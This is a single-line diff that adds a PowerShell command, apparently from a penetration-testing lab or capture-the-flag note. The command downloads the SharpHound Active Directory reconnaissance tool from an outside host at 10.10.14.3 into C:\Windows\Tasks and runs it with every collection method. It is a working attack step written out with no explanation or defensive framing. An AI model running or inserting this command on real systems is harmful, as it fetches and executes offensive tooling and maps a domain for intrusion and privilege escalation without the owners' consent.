@@ -1,0 +1,1 @@
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe') && c:\windows\\tasks\sharphound.exe --CollectionMethods All
